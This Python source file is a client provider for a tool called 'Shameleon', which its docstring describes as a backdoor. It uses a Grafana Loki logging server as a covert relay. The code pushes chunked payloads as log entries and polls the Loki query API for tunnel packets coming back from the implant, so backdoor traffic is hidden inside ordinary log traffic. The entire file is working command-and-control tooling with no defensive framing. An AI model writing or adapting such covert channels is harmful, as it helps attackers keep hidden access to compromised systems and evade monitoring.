import json
import time

import aiohttp

from shameleon_client.profile import Profile
from shameleon_client.providers.base import ShameleonProvider

PROVIDER_NAME = 'loki'


class LokiShameleonProvider(ShameleonProvider):
    """ A Loki provider for Shameleon.

    This provider is used to communicate with a Shameleon backdoor using
    Loki (logs database from Grafana).
    """

    def __init__(self, profile: Profile):
        super().__init__(profile)
        self._last_log_ts: float = time.time()

    async def _send_payload(self, data: list[str]):
        # TODO: Handle HTTP errors
        for i in range(0, len(data), self._profile.packet_number):
            chunks = data[i:i + self._profile.packet_number]
            start_ts = time.time_ns() - len(chunks)
            values: list[list[str]] = []
            for i, value in enumerate(chunks):
                values.append([str(start_ts + i), json.dumps({'message': value})])
            body = {
                "streams": [{
                    "stream": {
                        self._profile.backdoor_custom['label']: self._profile.backdoor_custom['label_in'],
                    },
                    "values": values,
                }],
            }
            async with aiohttp.ClientSession(raise_for_status=True) as session:
                await session.post(
                    f"{self._profile.backdoor_custom['url']}/loki/api/v1/push",
                    json=body,
                    auth=aiohttp.BasicAuth(
                        self._profile.backdoor_custom['user'],
                        self._profile.backdoor_custom['token'],
                    ),
                    timeout=self._profile.http_timeout,
                )

    async def _get_payload(self) -> list[tuple[str, str]]:
        # TODO: Handle HTTP errors
        output: list[tuple[str, str]] = []
        if self._last_log_ts == 0:
            start_time = time.time() - 20
        else:
            start_time = self._last_log_ts + 0.001
        params: dict[str, str | int | float] = {
            'query': f"{{{self._profile.backdoor_custom['label']}=\"{self._profile.backdoor_custom['label_out']}\"}}",
            'start': start_time,
            'end': time.time() + 1,
            'limit': 1000,
            'direction': 'FORWARD',
        }
        async with aiohttp.ClientSession(raise_for_status=True) as session:
            async with session.get(
                f"{self._profile.backdoor_custom['url']}/loki/api/v1/query_range",
                params=params,
                auth=aiohttp.BasicAuth(
                    self._profile.backdoor_custom['user'],
                    self._profile.backdoor_custom['token'],
                ),
                timeout=self._profile.http_timeout,
            ) as req:
                data = await req.json()
                results = data['data']['result']
        if len(results) == 0:
            return output
        for value in results[0]['values']:
            line_ts = int(value[0]) / 1000000000
            if line_ts <= self._last_log_ts:
                continue
            if len(value) == 0:
                continue
            json_value = json.loads(value[1])
            tunnel_id, packet_data = json_value['message'].split(':', 2)
            self._last_log_ts = max(self._last_log_ts, line_ts)
            output.append((tunnel_id, packet_data))
        return output
